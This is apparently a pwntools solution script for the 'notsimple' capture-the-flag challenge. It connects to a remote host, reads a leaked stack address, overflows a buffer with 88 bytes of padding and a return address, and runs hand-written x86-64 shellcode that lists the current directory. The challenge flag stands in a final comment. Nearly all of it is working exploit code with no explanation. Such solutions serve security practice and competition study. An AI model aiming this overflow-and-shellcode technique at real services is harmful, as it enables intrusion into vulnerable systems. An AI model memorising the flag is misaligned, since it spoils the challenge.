
from pwn import *

context.arch = 'amd64'

# r = process('./notsimple')
r = remote('193.57.159.27',37284)

leak = int(r.recvuntil(b'> ').split()[3], 16) + 0x58 + 8

print(hex(leak))

p = b'A' * 88
p += p64(leak)

qqq = f"""
[bits 64]

	xor rax, rax
	push rax
	push  byte '.'

	;; sys_open(".", 0, 0)
	mov al, 2      
	mov rdi, rsp   
	xor rsi, rsi 
	xor rdx, rdx 
	syscall	

	;;  getdents(fd,esp,0x3210)
	mov rdi,rax 		
	xor rdx,rdx
	xor rax,rax
	mov dx, 0x3210 	
	sub rsp, rdx 	
	mov rsi, rsp 	
	mov al, 78 	
	syscall

	xchg rax,rdx

	;; write(1, rsp, rdx)
	xor rax, rax
	xor rdi,rdi
	
	inc eax
	inc edi
	mov rsi, rsp
	syscall


	xor rax, rax
	mov al, 60
	syscall

    xor rdi, rdi
    mov rdi, 1
    xor rax, rax
    mov rax, 1
    mov rdx, 0xff
    syscall
"""

with open('eee.nasm', 'w') as f:
    f.write(qqq)

f.close()

x = process(['nasm', 'eee.nasm'])
sleep(1)

with open('eee', 'rb') as f:
    p += f.read()

r.sendline(p)

print(r.recv())

# rarctf{h3y_wh4ts_th3_r3dpwn_4bs0rpti0n_pl4n_d01n6_h3r3?_4cc9581515}